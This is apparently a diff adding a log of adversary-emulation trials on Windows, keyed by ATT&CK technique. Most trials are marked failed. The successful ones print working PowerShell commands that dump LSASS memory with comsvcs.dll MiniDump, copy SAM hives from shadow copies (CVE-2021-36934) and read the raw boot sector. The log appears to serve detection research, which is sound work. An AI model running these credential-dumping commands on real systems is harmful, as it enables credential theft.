@@ -1,0 +1,1490 @@
+==============================
+adversary_id: atomic__t1005__collection__data_from_local_system__3db695e5387d0fd3bb4e53c330814b7f__trial_5
+
+atomic_ordering: ['3db695e5387d0fd3bb4e53c330814b7f']
+------------------------------
+------------------------------
+failed execution of technique
+==============================
+==============================
+adversary_id: atomic__t1003__credential-access__os_credential_dumping__8de14c0ea1b80dbd5de0cf5d28cff16b__trial_3
+
+atomic_ordering: ['8de14c0ea1b80dbd5de0cf5d28cff16b']
+------------------------------
+------------------------------
+failed execution of technique
+==============================
+==============================
+adversary_id: atomic__t1003_001__credential-access__os_credential_dumping-_lsass_memory__60bb6f8468aa98b75be2521861a164d5__trial_4
+
+atomic_ordering: ['60bb6f8468aa98b75be2521861a164d5']
+------------------------------
+------------------------------
+failed execution of technique
+==============================
+==============================
+adversary_id: atomic__t1003_001__credential-access__os_credential_dumping-_lsass_memory__60bb6f8468aa98b75be2521861a164d5__trial_2
+
+atomic_ordering: ['60bb6f8468aa98b75be2521861a164d5']
+------------------------------
+------------------------------
+failed execution of technique
+==============================
+==============================
+adversary_id: atomic__t1003__credential-access__os_credential_dumping__24a6ff3816824ecae285f847995709cf__trial_2
+
+atomic_ordering: ['24a6ff3816824ecae285f847995709cf']
+------------------------------
+------------------------------
+failed execution of technique
+==============================
+==============================
+adversary_id: atomic__t1012__discovery__query_registry__691d489fe77afbfe8646419fce6759fd__trial_1
+
+atomic_ordering: ['691d489fe77afbfe8646419fce6759fd']
+------------------------------
+------------------------------
+failed execution of technique
+==============================
+==============================
+adversary_id: atomic__t1005__collection__data_from_local_system__3db695e5387d0fd3bb4e53c330814b7f__trial_3
+
+atomic_ordering: ['3db695e5387d0fd3bb4e53c330814b7f']
+------------------------------
+------------------------------
+failed execution of technique
+==============================
+==============================
+adversary_id: atomic__t1003_006__credential-access__os_credential_dumping-_dcsync__88d78618bbba0ca862d8d5a6f6fb4d72__trial_2
+
+atomic_ordering: ['88d78618bbba0ca862d8d5a6f6fb4d72']
+------------------------------
+------------------------------
+failed execution of technique
+==============================
+==============================
+adversary_id: atomic__t1006__defense-evasion__direct_volume_access__80e752c5fc69a56ccb86bc90efc5eff6__trial_1
+
+atomic_ordering: ['80e752c5fc69a56ccb86bc90efc5eff6']
+------------------------------
+{'ability_id': '80e752c5fc69a56ccb86bc90efc5eff6',
+ 'agent_reported_time': '2023-11-08T14:53:59Z',
+ 'attack': {'tactic': 'defense-evasion',
+            'technique_id': 'T1006',
+            'technique_name': 'Direct Volume Access'},
+ 'command': '$buffer = New-Object byte[] 11; $handle = New-Object '
+            'IO.FileStream "\\\\.\\C:", \'Open\', \'Read\', \'ReadWrite\'; '
+            '$handle.Read($buffer, 0, $buffer.Length); $handle.Close(); '
+            'Format-Hex -InputObject $buffer',
+ 'delegated': '2023-11-09T18:55:15Z',
+ 'description': 'This test uses PowerShell to open a handle on the drive '
+                'volume via the `\\\\.\\` [DOS device path '
+                'specifier](https://docs.microsoft.com/en-us/dotnet/standard/io/file-path-formats#dos-device-paths) '
+                'and perform direct access read of the first few bytes of the '
+                'volume.\n'
+                'On success, a hex dump of the first 11 bytes of the volume is '
+                'displayed.\n'
+                '\n'
+                'For a NTFS volume, it should correspond to the following '
+                'sequence ([NTFS partition boot '
+                'sector](https://en.wikipedia.org/wiki/NTFS#Partition_Boot_Sector_(VBR))):\n'
+                '```\n'
+                '           00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F\n'
+                '\n'
+                '00000000   EB 52 90 4E 54 46 53 20 20 20 20                 '
+                'ëR?NTFS\n'
+                '```',
+ 'executor': 'psh',
+ 'link_id': '49862593-2131-48b7-90b1-451a11c1b994',
+ 'name': 'Read volume boot sector via DOS device path (PowerShell)',
+ 'pid': 32,
+ 'plaintext_command': '$buffer = New-Object byte[] 11; $handle = New-Object '
+                      'IO.FileStream "\\\\.\\C:", \'Open\', \'Read\', '
+                      "'ReadWrite'; $handle.Read($buffer, 0, $buffer.Length); "
+                      '$handle.Close(); Format-Hex -InputObject $buffer',
+ 'platform': 'windows',
+ 'run': '2023-11-09T18:55:58Z',
+ 'status': 0}
+------------------------------
+successfully executed technique
+==============================
+==============================
+adversary_id: atomic__t1003_002__credential-access__os_credential_dumping-_security_account_manager__69219b448ba0a75bae573d58d8b6cf40__trial_2
+
+atomic_ordering: ['69219b448ba0a75bae573d58d8b6cf40']
+------------------------------
+{'ability_id': '69219b448ba0a75bae573d58d8b6cf40',
+ 'agent_reported_time': '2023-11-09T05:20:46Z',
+ 'attack': {'tactic': 'credential-access',
+            'technique_id': 'T1003.002',
+            'technique_name': 'OS Credential Dumping: Security Account '
+                              'Manager'},
+ 'command': '1..10 | % { ;  try { '
+            '[System.IO.File]::Copy("\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy$_\\Windows\\System32\\config\\SAM" '
+            ', "$env:TEMP\\SAMvss$_", "true") } catch {};  ls '
+            '"$env:TEMP\\SAMvss$_" -ErrorAction Ignore; }',
+ 'delegated': '2023-11-09T05:20:42Z',
+ 'description': 'Dump hives from volume shadow copies with System.IO.File. '
+                '[CVE-2021-36934](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-36934)\n',
+ 'executor': 'psh',
+ 'link_id': '3c56fe3b-f0ae-416c-b81a-991b9d53d43d',
+ 'name': 'dump volume shadow copy hives with System.IO.File',
+ 'pid': 8148,
+ 'plaintext_command': '1..10 | % { ;  try { '
+                      '[System.IO.File]::Copy("\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy$_\\Windows\\System32\\config\\SAM" '
+                      ', "$env:TEMP\\SAMvss$_", "true") } catch {};  ls '
+                      '"$env:TEMP\\SAMvss$_" -ErrorAction Ignore; }',
+ 'platform': 'windows',
+ 'run': '2023-11-09T05:20:46Z',
+ 'status': 0}
+------------------------------
+successfully executed technique
+==============================
+==============================
+adversary_id: atomic__t1012__discovery__query_registry__54f95564a265f67159d1f8ff907cd156__trial_2
+
+atomic_ordering: ['54f95564a265f67159d1f8ff907cd156']
+------------------------------
+------------------------------
+failed execution of technique
+==============================
+==============================
+adversary_id: joonyoung_no_command_single_technique_profile_for_artifactual_event_identification_trial_1
+
+atomic_ordering: ['joonyounggwak_no_command_ability_id']
+==============================
+==============================
+adversary_id: atomic__t1003__credential-access__os_credential_dumping__24a6ff3816824ecae285f847995709cf__trial_1
+
+atomic_ordering: ['24a6ff3816824ecae285f847995709cf']
+------------------------------
+------------------------------
+failed execution of technique
+==============================
+==============================
+adversary_id: atomic__t1003_003__credential-access__os_credential_dumping-_ntds__6dc5c587fd22d65b81a443b7ce065ab1__trial_5
+
+atomic_ordering: ['6dc5c587fd22d65b81a443b7ce065ab1']
+------------------------------
+------------------------------
+failed execution of technique
+==============================
+==============================
+adversary_id: atomic__t1003_001__credential-access__os_credential_dumping-_lsass_memory__35d92515122effdd73801c6ac3021da7__trial_4
+
+atomic_ordering: ['35d92515122effdd73801c6ac3021da7']
+------------------------------
+{'ability_id': '35d92515122effdd73801c6ac3021da7',
+ 'agent_reported_time': '2023-11-08T17:51:19Z',
+ 'attack': {'tactic': 'credential-access',
+            'technique_id': 'T1003.001',
+            'technique_name': 'OS Credential Dumping: LSASS Memory'},
+ 'command': 'C:\\Windows\\System32\\rundll32.exe '
+            'C:\\windows\\System32\\comsvcs.dll, MiniDump (Get-Process '
+            'lsass).id $env:TEMP\\lsass-comsvcs.dmp full',
+ 'delegated': '2023-11-08T17:51:07Z',
+ 'description': 'The memory of lsass.exe is often dumped for offline '
+                'credential theft attacks. This can be achieved with a '
+                'built-in dll.\n'
+                '\n'
+                'Upon successful execution, you should see the following file '
+                'created $env:TEMP\\lsass-comsvcs.dmp.\n',
+ 'executor': 'psh',
+ 'link_id': 'b791877b-208d-401d-b87c-e25e9808ceae',
+ 'name': 'Dump LSASS.exe Memory using comsvcs.dll',
+ 'pid': 4424,
+ 'plaintext_command': 'C:\\Windows\\System32\\rundll32.exe '
+                      'C:\\windows\\System32\\comsvcs.dll, MiniDump '
+                      '(Get-Process lsass).id $env:TEMP\\lsass-comsvcs.dmp '
+                      'full',
+ 'platform': 'windows',
+ 'run': '2023-11-08T17:51:23Z',
+ 'status': 0}
+------------------------------
+successfully executed technique
+==============================
+==============================
+adversary_id: atomic__t1003_002__credential-access__os_credential_dumping-_security_account_manager__1ae855684c48448c29ad04858bbe5a2a__trial_1
+
+atomic_ordering: ['1ae855684c48448c29ad04858bbe5a2a']
+------------------------------
+------------------------------
+failed execution of technique
+==============================
+==============================
+adversary_id: atomic__t1003_001__credential-access__os_credential_dumping-_lsass_memory__82dcefb5c3512d73bf2248cb0127c4ae__trial_2
+
+atomic_ordering: ['82dcefb5c3512d73bf2248cb0127c4ae']
+------------------------------
+------------------------------
+failed execution of technique
+==============================
+==============================
+adversary_id: atomic__t1003_001__credential-access__os_credential_dumping-_lsass_memory__35d92515122effdd73801c6ac3021da7__trial_2
+
+atomic_ordering: ['35d92515122effdd73801c6ac3021da7']
+------------------------------
+{'ability_id': '35d92515122effdd73801c6ac3021da7',
+ 'agent_reported_time': '2023-11-08T17:14:25Z',
+ 'attack': {'tactic': 'credential-access',
+            'technique_id': 'T1003.001',
+            'technique_name': 'OS Credential Dumping: LSASS Memory'},
+ 'command': 'C:\\Windows\\System32\\rundll32.exe '
+            'C:\\windows\\System32\\comsvcs.dll, MiniDump (Get-Process '
+            'lsass).id $env:TEMP\\lsass-comsvcs.dmp full',
+ 'delegated': '2023-11-08T17:14:09Z',
+ 'description': 'The memory of lsass.exe is often dumped for offline '
+                'credential theft attacks. This can be achieved with a '
+                'built-in dll.\n'
+                '\n'
+                'Upon successful execution, you should see the following file '
+                'created $env:TEMP\\lsass-comsvcs.dmp.\n',
+ 'executor': 'psh',
+ 'link_id': '4b69d6ba-3426-461c-b56b-a1b99664c7f4',
+ 'name': 'Dump LSASS.exe Memory using comsvcs.dll',
+ 'pid': 7680,
+ 'plaintext_command': 'C:\\Windows\\System32\\rundll32.exe '
+                      'C:\\windows\\System32\\comsvcs.dll, MiniDump '
+                      '(Get-Process lsass).id $env:TEMP\\lsass-comsvcs.dmp '
+                      'full',
+ 'platform': 'windows',
+ 'run': '2023-11-08T17:14:33Z',
+ 'status': 0}
+------------------------------
+successfully executed technique
+==============================
+==============================
+adversary_id: atomic__t1003_003__credential-access__os_credential_dumping-_ntds__6dc5c587fd22d65b81a443b7ce065ab1__trial_3
+
+atomic_ordering: ['6dc5c587fd22d65b81a443b7ce065ab1']
+------------------------------
+------------------------------
+failed execution of technique
+==============================
+==============================
+adversary_id: atomic__t1003_002__credential-access__os_credential_dumping-_security_account_manager__1ae855684c48448c29ad04858bbe5a2a__trial_4
+
+atomic_ordering: ['1ae855684c48448c29ad04858bbe5a2a']
+------------------------------
+------------------------------
+failed execution of technique
+==============================
+==============================
+adversary_id: atomic__t1006__defense-evasion__direct_volume_access__80e752c5fc69a56ccb86bc90efc5eff6__trial_3
+
+atomic_ordering: ['80e752c5fc69a56ccb86bc90efc5eff6']
+------------------------------
+{'ability_id': '80e752c5fc69a56ccb86bc90efc5eff6',
+ 'agent_reported_time': '2023-11-08T14:52:33Z',
+ 'attack': {'tactic': 'defense-evasion',
+            'technique_id': 'T1006',
+            'technique_name': 'Direct Volume Access'},
+ 'command': '$buffer = New-Object byte[] 11; $handle = New-Object '
+            'IO.FileStream "\\\\.\\C:", \'Open\', \'Read\', \'ReadWrite\'; '
+            '$handle.Read($buffer, 0, $buffer.Length); $handle.Close(); '
+            'Format-Hex -InputObject $buffer',
+ 'delegated': '2023-11-09T19:31:04Z',
+ 'description': 'This test uses PowerShell to open a handle on the drive '
+                'volume via the `\\\\.\\` [DOS device path '
+                'specifier](https://docs.microsoft.com/en-us/dotnet/standard/io/file-path-formats#dos-device-paths) '
+                'and perform direct access read of the first few bytes of the '
+                'volume.\n'
+                'On success, a hex dump of the first 11 bytes of the volume is '
+                'displayed.\n'
+                '\n'
+                'For a NTFS volume, it should correspond to the following '
+                'sequence ([NTFS partition boot '
+                'sector](https://en.wikipedia.org/wiki/NTFS#Partition_Boot_Sector_(VBR))):\n'
+                '```\n'
+                '           00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F\n'
+                '\n'
+                '00000000   EB 52 90 4E 54 46 53 20 20 20 20                 '
+                'ëR?NTFS\n'
+                '```',
+ 'executor': 'psh',
+ 'link_id': '395a0192-eedd-49db-8afe-29ff7d5f70f3',
+ 'name': 'Read volume boot sector via DOS device path (PowerShell)',
+ 'pid': 10672,
+ 'plaintext_command': '$buffer = New-Object byte[] 11; $handle = New-Object '
+                      'IO.FileStream "\\\\.\\C:", \'Open\', \'Read\', '
+                      "'ReadWrite'; $handle.Read($buffer, 0, $buffer.Length); "
+                      '$handle.Close(); Format-Hex -InputObject $buffer',
+ 'platform': 'windows',
+ 'run': '2023-11-09T19:31:06Z',
+ 'status': 0}
+------------------------------
+successfully executed technique
+==============================
+==============================
+adversary_id: atomic__t1005__collection__data_from_local_system__3db695e5387d0fd3bb4e53c330814b7f__trial_4
+
+atomic_ordering: ['3db695e5387d0fd3bb4e53c330814b7f']
+------------------------------
+------------------------------
+failed execution of technique
+==============================
+==============================
+adversary_id: atomic__t1003__credential-access__os_credential_dumping__f6c693da77b8824b3c52ba3b6ca0bf88__trial_2
+
+atomic_ordering: ['f6c693da77b8824b3c52ba3b6ca0bf88']
+------------------------------
+------------------------------
+failed execution of technique
+==============================
+==============================
+adversary_id: atomic__t1003_001__credential-access__os_credential_dumping-_lsass_memory__36fc42ced381416ca7d5d7af0ee0561b__trial_1
+
+atomic_ordering: ['36fc42ced381416ca7d5d7af0ee0561b']
+------------------------------
+------------------------------
+failed execution of technique
+==============================
+==============================
+adversary_id: atomic__t1003__credential-access__os_credential_dumping__24a6ff3816824ecae285f847995709cf__trial_4
+
+atomic_ordering: ['24a6ff3816824ecae285f847995709cf']
+------------------------------
+------------------------------
+failed execution of technique
+==============================
+==============================
+adversary_id: atomic__t1003_002__credential-access__os_credential_dumping-_security_account_manager__1ae855684c48448c29ad04858bbe5a2a__trial_5
+
+atomic_ordering: ['1ae855684c48448c29ad04858bbe5a2a']
+------------------------------
+------------------------------
+failed execution of technique
+==============================
+==============================
+adversary_id: atomic__t1016__discovery__system_network_configuration_discovery__db1bb4f8462260edf0e7c4b892dd66ca__trial_1
+
+atomic_ordering: ['db1bb4f8462260edf0e7c4b892dd66ca']
+------------------------------
+------------------------------
+failed execution of technique
+==============================
+==============================
+adversary_id: atomic__t1003_001__credential-access__os_credential_dumping-_lsass_memory__60bb6f8468aa98b75be2521861a164d5__trial_3
+
+atomic_ordering: ['60bb6f8468aa98b75be2521861a164d5']
+------------------------------
+------------------------------
+failed execution of technique
+==============================
+==============================
+adversary_id: atomic__t1003_001__credential-access__os_credential_dumping-_lsass_memory__60bb6f8468aa98b75be2521861a164d5__trial_5
+
+atomic_ordering: ['60bb6f8468aa98b75be2521861a164d5']
+------------------------------
+------------------------------
+failed execution of technique
+==============================
+==============================
+adversary_id: atomic__t1003_001__credential-access__os_credential_dumping-_lsass_memory__8e01631039faf6a9a84df376bf9ad0f1__trial_2
+
+atomic_ordering: ['8e01631039faf6a9a84df376bf9ad0f1']
+------------------------------
+------------------------------
+failed execution of technique
+==============================
+==============================
+adversary_id: atomic__t1005__collection__data_from_local_system__3db695e5387d0fd3bb4e53c330814b7f__trial_2
+
+atomic_ordering: ['3db695e5387d0fd3bb4e53c330814b7f']
+------------------------------
+------------------------------
+failed execution of technique
+==============================
+==============================
+adversary_id: atomic__t1003_003__credential-access__os_credential_dumping-_ntds__6dc5c587fd22d65b81a443b7ce065ab1__trial_4
+
+atomic_ordering: ['6dc5c587fd22d65b81a443b7ce065ab1']
+------------------------------
+------------------------------
+failed execution of technique
+==============================
+==============================
+adversary_id: atomic__t1003__credential-access__os_credential_dumping__2cc37a6cf2f1acdeaa6a6638016444d1__trial_1
+
+atomic_ordering: ['2cc37a6cf2f1acdeaa6a6638016444d1']
+------------------------------
+------------------------------
+failed execution of technique
+==============================
+==============================
+adversary_id: atomic__t1016__discovery__system_network_configuration_discovery__db1bb4f8462260edf0e7c4b892dd66ca__trial_3
+
+atomic_ordering: ['db1bb4f8462260edf0e7c4b892dd66ca']
+------------------------------
+------------------------------
+failed execution of technique
+==============================
+==============================
+adversary_id: atomic__t1012__discovery__query_registry__691d489fe77afbfe8646419fce6759fd__trial_3
+
+atomic_ordering: ['691d489fe77afbfe8646419fce6759fd']
+------------------------------
+------------------------------
+failed execution of technique
+==============================
+==============================
+adversary_id: atomic__t1005__collection__data_from_local_system__3db695e5387d0fd3bb4e53c330814b7f__trial_1
+
+atomic_ordering: ['3db695e5387d0fd3bb4e53c330814b7f']
+------------------------------
+------------------------------
+failed execution of technique
+==============================
+==============================
+adversary_id: atomic__t1012__discovery__query_registry__54f95564a265f67159d1f8ff907cd156__trial_1
+
+atomic_ordering: ['54f95564a265f67159d1f8ff907cd156']
+------------------------------
+------------------------------
+failed execution of technique
+==============================
+==============================
+adversary_id: atomic__t1003_003__credential-access__os_credential_dumping-_ntds__6dc5c587fd22d65b81a443b7ce065ab1__trial_2
+
+atomic_ordering: ['6dc5c587fd22d65b81a443b7ce065ab1']
+------------------------------
+------------------------------
+failed execution of technique
+==============================
+==============================
+adversary_id: atomic__t1003__credential-access__os_credential_dumping__24a6ff3816824ecae285f847995709cf__trial_3
+
+atomic_ordering: ['24a6ff3816824ecae285f847995709cf']
+------------------------------
+------------------------------
+failed execution of technique
+==============================
+==============================
+adversary_id: atomic__t1003_006__credential-access__os_credential_dumping-_dcsync__88d78618bbba0ca862d8d5a6f6fb4d72__trial_1
+
+atomic_ordering: ['88d78618bbba0ca862d8d5a6f6fb4d72']
+------------------------------
+------------------------------
+failed execution of technique
+==============================
+==============================
+adversary_id: atomic__t1012__discovery__query_registry__691d489fe77afbfe8646419fce6759fd__trial_2
+
+atomic_ordering: ['691d489fe77afbfe8646419fce6759fd']
+------------------------------
+------------------------------
+failed execution of technique
+==============================
+==============================
+adversary_id: atomic__t1003_001__credential-access__os_credential_dumping-_lsass_memory__bbc786e45aff314d33e60133f010f00c__trial_3
+
+atomic_ordering: ['bbc786e45aff314d33e60133f010f00c']
+------------------------------
+------------------------------
+failed execution of technique
+==============================
+==============================
+adversary_id: atomic__t1003__credential-access__os_credential_dumping__8de14c0ea1b80dbd5de0cf5d28cff16b__trial_2
+
+atomic_ordering: ['8de14c0ea1b80dbd5de0cf5d28cff16b']
+------------------------------
+------------------------------
+failed execution of technique
+==============================
+==============================
+adversary_id: atomic__t1003__credential-access__os_credential_dumping__f6c693da77b8824b3c52ba3b6ca0bf88__trial_1
+
+atomic_ordering: ['f6c693da77b8824b3c52ba3b6ca0bf88']
+------------------------------
+------------------------------
+failed execution of technique
+==============================
+==============================
+adversary_id: atomic__t1012__discovery__query_registry__54f95564a265f67159d1f8ff907cd156__trial_3
+
+atomic_ordering: ['54f95564a265f67159d1f8ff907cd156']
+------------------------------
+------------------------------
+failed execution of technique
+==============================
+==============================
+adversary_id: atomic__t1003_001__credential-access__os_credential_dumping-_lsass_memory__36fc42ced381416ca7d5d7af0ee0561b__trial_3
+
+atomic_ordering: ['36fc42ced381416ca7d5d7af0ee0561b']
+------------------------------
+------------------------------
+failed execution of technique
+==============================
+==============================
+adversary_id: atomic__t1003__credential-access__os_credential_dumping__2cc37a6cf2f1acdeaa6a6638016444d1__trial_2
+
+atomic_ordering: ['2cc37a6cf2f1acdeaa6a6638016444d1']
+------------------------------
+------------------------------
+failed execution of technique
+==============================
+==============================
+adversary_id: atomic__t1016__discovery__system_network_configuration_discovery__db1bb4f8462260edf0e7c4b892dd66ca__trial_2
+
+atomic_ordering: ['db1bb4f8462260edf0e7c4b892dd66ca']
+------------------------------
+------------------------------
+failed execution of technique
+==============================
+==============================
+adversary_id: atomic__t1003__credential-access__os_credential_dumping__f6c693da77b8824b3c52ba3b6ca0bf88__trial_4
+
+atomic_ordering: ['f6c693da77b8824b3c52ba3b6ca0bf88']
+------------------------------
+------------------------------
+failed execution of technique
+==============================
+==============================
+adversary_id: atomic__t1003__credential-access__os_credential_dumping__2cc37a6cf2f1acdeaa6a6638016444d1__trial_4
+
+atomic_ordering: ['2cc37a6cf2f1acdeaa6a6638016444d1']
+------------------------------
+------------------------------
+failed execution of technique
+==============================
+==============================
+adversary_id: atomic__t1012__discovery__query_registry__54f95564a265f67159d1f8ff907cd156__trial_5
+
+atomic_ordering: ['54f95564a265f67159d1f8ff907cd156']
+------------------------------
+------------------------------
+failed execution of technique
+==============================
+==============================
+adversary_id: atomic__t1003_001__credential-access__os_credential_dumping-_lsass_memory__36fc42ced381416ca7d5d7af0ee0561b__trial_4
+
+atomic_ordering: ['36fc42ced381416ca7d5d7af0ee0561b']
+------------------------------
+------------------------------
+failed execution of technique
+==============================
+==============================
+adversary_id: atomic__t1003_001__credential-access__os_credential_dumping-_lsass_memory__bbc786e45aff314d33e60133f010f00c__trial_4
+
+atomic_ordering: ['bbc786e45aff314d33e60133f010f00c']
+------------------------------
+------------------------------
+failed execution of technique
+==============================
+==============================
+adversary_id: atomic__t1003_002__credential-access__os_credential_dumping-_security_account_manager__69219b448ba0a75bae573d58d8b6cf40__trial_4
+
+atomic_ordering: ['69219b448ba0a75bae573d58d8b6cf40']
+------------------------------
+{'ability_id': '69219b448ba0a75bae573d58d8b6cf40',
+ 'agent_reported_time': '2023-11-09T05:56:44Z',
+ 'attack': {'tactic': 'credential-access',
+            'technique_id': 'T1003.002',
+            'technique_name': 'OS Credential Dumping: Security Account '
+                              'Manager'},
+ 'command': '1..10 | % { ;  try { '
+            '[System.IO.File]::Copy("\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy$_\\Windows\\System32\\config\\SAM" '
+            ', "$env:TEMP\\SAMvss$_", "true") } catch {};  ls '
+            '"$env:TEMP\\SAMvss$_" -ErrorAction Ignore; }',
+ 'delegated': '2023-11-09T05:55:59Z',
+ 'description': 'Dump hives from volume shadow copies with System.IO.File. '
+                '[CVE-2021-36934](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-36934)\n',
+ 'executor': 'psh',
+ 'link_id': '28a5758b-ccef-4287-8b7d-785d956325f5',
+ 'name': 'dump volume shadow copy hives with System.IO.File',
+ 'pid': 9532,
+ 'plaintext_command': '1..10 | % { ;  try { '
+                      '[System.IO.File]::Copy("\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy$_\\Windows\\System32\\config\\SAM" '
+                      ', "$env:TEMP\\SAMvss$_", "true") } catch {};  ls '
+                      '"$env:TEMP\\SAMvss$_" -ErrorAction Ignore; }',
+ 'platform': 'windows',
+ 'run': '2023-11-09T05:56:44Z',
+ 'status': 0}
+------------------------------
+successfully executed technique
+==============================
+==============================
+adversary_id: atomic__t1003_002__credential-access__os_credential_dumping-_security_account_manager__1ae855684c48448c29ad04858bbe5a2a__trial_2
+
+atomic_ordering: ['1ae855684c48448c29ad04858bbe5a2a']
+------------------------------
+------------------------------
+failed execution of technique
+==============================
+==============================
+adversary_id: atomic__t1003_001__credential-access__os_credential_dumping-_lsass_memory__8e01631039faf6a9a84df376bf9ad0f1__trial_4
+
+atomic_ordering: ['8e01631039faf6a9a84df376bf9ad0f1']
+------------------------------
+------------------------------
+failed execution of technique
+==============================
+==============================
+adversary_id: atomic__t1003_001__credential-access__os_credential_dumping-_lsass_memory__8e01631039faf6a9a84df376bf9ad0f1__trial_1
+
+atomic_ordering: ['8e01631039faf6a9a84df376bf9ad0f1']
+------------------------------
+------------------------------
+failed execution of technique
+==============================
+==============================
+adversary_id: atomic__t1003__credential-access__os_credential_dumping__8de14c0ea1b80dbd5de0cf5d28cff16b__trial_5
+
+atomic_ordering: ['8de14c0ea1b80dbd5de0cf5d28cff16b']
+------------------------------
+------------------------------
+failed execution of technique
+==============================
+==============================
+adversary_id: atomic__t1003_002__credential-access__os_credential_dumping-_security_account_manager__1ae855684c48448c29ad04858bbe5a2a__trial_3
+
+atomic_ordering: ['1ae855684c48448c29ad04858bbe5a2a']
+------------------------------
+------------------------------
+failed execution of technique
+==============================
+==============================
+adversary_id: atomic__t1003_002__credential-access__os_credential_dumping-_security_account_manager__3bcfa369fd1f214e4d05944228eeb212__trial_3
+
+atomic_ordering: ['3bcfa369fd1f214e4d05944228eeb212']
+------------------------------
+------------------------------
+failed execution of technique
+==============================
+==============================
+adversary_id: atomic__t1003_001__credential-access__os_credential_dumping-_lsass_memory__82dcefb5c3512d73bf2248cb0127c4ae__trial_4
+
+atomic_ordering: ['82dcefb5c3512d73bf2248cb0127c4ae']
+------------------------------
+------------------------------
+failed execution of technique
+==============================
+==============================
+adversary_id: atomic__t1012__discovery__query_registry__691d489fe77afbfe8646419fce6759fd__trial_5
+
+atomic_ordering: ['691d489fe77afbfe8646419fce6759fd']
+------------------------------
+------------------------------
+failed execution of technique
+==============================
+==============================
+adversary_id: atomic__t1003_006__credential-access__os_credential_dumping-_dcsync__88d78618bbba0ca862d8d5a6f6fb4d72__trial_5
+
+atomic_ordering: ['88d78618bbba0ca862d8d5a6f6fb4d72']
+------------------------------
+------------------------------
+failed execution of technique
+==============================
+==============================
+adversary_id: atomic__t1003_001__credential-access__os_credential_dumping-_lsass_memory__35d92515122effdd73801c6ac3021da7__trial_1
+
+atomic_ordering: ['35d92515122effdd73801c6ac3021da7']
+------------------------------
+{'ability_id': '35d92515122effdd73801c6ac3021da7',
+ 'agent_reported_time': '2023-11-08T16:55:18Z',
+ 'attack': {'tactic': 'credential-access',
+            'technique_id': 'T1003.001',
+            'technique_name': 'OS Credential Dumping: LSASS Memory'},
+ 'command': 'C:\\Windows\\System32\\rundll32.exe '
+            'C:\\windows\\System32\\comsvcs.dll, MiniDump (Get-Process '
+            'lsass).id $env:TEMP\\lsass-comsvcs.dmp full',
+ 'delegated': '2023-11-08T16:55:16Z',
+ 'description': 'The memory of lsass.exe is often dumped for offline '
+                'credential theft attacks. This can be achieved with a '
+                'built-in dll.\n'
+                '\n'
+                'Upon successful execution, you should see the following file '
+                'created $env:TEMP\\lsass-comsvcs.dmp.\n',
+ 'executor': 'psh',
+ 'link_id': 'bec1af63-d1a2-44e6-bb66-565c737ef0fc',
+ 'name': 'Dump LSASS.exe Memory using comsvcs.dll',
+ 'pid': 2344,
+ 'plaintext_command': 'C:\\Windows\\System32\\rundll32.exe '
+                      'C:\\windows\\System32\\comsvcs.dll, MiniDump '
+                      '(Get-Process lsass).id $env:TEMP\\lsass-comsvcs.dmp '
+                      'full',
+ 'platform': 'windows',
+ 'run': '2023-11-08T16:55:19Z',
+ 'status': 0}
+------------------------------
+successfully executed technique
+==============================
+==============================
+adversary_id: joonyoung_no_command_single_technique_profile_for_artifactual_event_identification_trial_1
+
+atomic_ordering: ['joonyounggwak_no_command_ability_id']
+------------------------------
+{'ability_id': '9f87473c-0957-4222-90c1-ed9415273502',
+ 'agent_reported_time': '2023-11-08T14:55:12Z',
+ 'attack': {'tactic': 'auto-generated',
+            'technique_id': 'auto-generated',
+            'technique_name': 'auto-generated'},
+ 'command': '""',
+ 'delegated': '2023-11-10T01:31:47Z',
+ 'description': 'Manual command ability',
+ 'executor': 'psh',
+ 'link_id': 'fb79b969-1a4b-4d80-87ff-529a9952c33a',
+ 'name': 'Manual Command',
+ 'pid': 8204,
+ 'plaintext_command': '""',
+ 'platform': 'windows',
+ 'run': '2023-11-10T01:32:18Z',
+ 'status': 0}
+------------------------------
+successfully executed technique
+==============================
+==============================
+adversary_id: atomic__t1003_001__credential-access__os_credential_dumping-_lsass_memory__8e01631039faf6a9a84df376bf9ad0f1__trial_3
+
+atomic_ordering: ['8e01631039faf6a9a84df376bf9ad0f1']
+------------------------------
+------------------------------
+failed execution of technique
+==============================
+==============================
+adversary_id: atomic__t1006__defense-evasion__direct_volume_access__80e752c5fc69a56ccb86bc90efc5eff6__trial_5
+
+atomic_ordering: ['80e752c5fc69a56ccb86bc90efc5eff6']
+------------------------------
+{'ability_id': '80e752c5fc69a56ccb86bc90efc5eff6',
+ 'agent_reported_time': '2023-11-08T14:52:42Z',
+ 'attack': {'tactic': 'defense-evasion',
+            'technique_id': 'T1006',
+            'technique_name': 'Direct Volume Access'},
+ 'command': '$buffer = New-Object byte[] 11; $handle = New-Object '
+            'IO.FileStream "\\\\.\\C:", \'Open\', \'Read\', \'ReadWrite\'; '
+            '$handle.Read($buffer, 0, $buffer.Length); $handle.Close(); '
+            'Format-Hex -InputObject $buffer',
+ 'delegated': '2023-11-09T20:07:42Z',
+ 'description': 'This test uses PowerShell to open a handle on the drive '
+                'volume via the `\\\\.\\` [DOS device path '
+                'specifier](https://docs.microsoft.com/en-us/dotnet/standard/io/file-path-formats#dos-device-paths) '
+                'and perform direct access read of the first few bytes of the '
+                'volume.\n'
+                'On success, a hex dump of the first 11 bytes of the volume is '
+                'displayed.\n'
+                '\n'
+                'For a NTFS volume, it should correspond to the following '
+                'sequence ([NTFS partition boot '
+                'sector](https://en.wikipedia.org/wiki/NTFS#Partition_Boot_Sector_(VBR))):\n'
+                '```\n'
+                '           00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F\n'
+                '\n'
+                '00000000   EB 52 90 4E 54 46 53 20 20 20 20                 '
+                'ëR?NTFS\n'
+                '```',
+ 'executor': 'psh',
+ 'link_id': '9668a989-53ea-4830-9403-fc98f83c899f',
+ 'name': 'Read volume boot sector via DOS device path (PowerShell)',
+ 'pid': 11204,
+ 'plaintext_command': '$buffer = New-Object byte[] 11; $handle = New-Object '
+                      'IO.FileStream "\\\\.\\C:", \'Open\', \'Read\', '
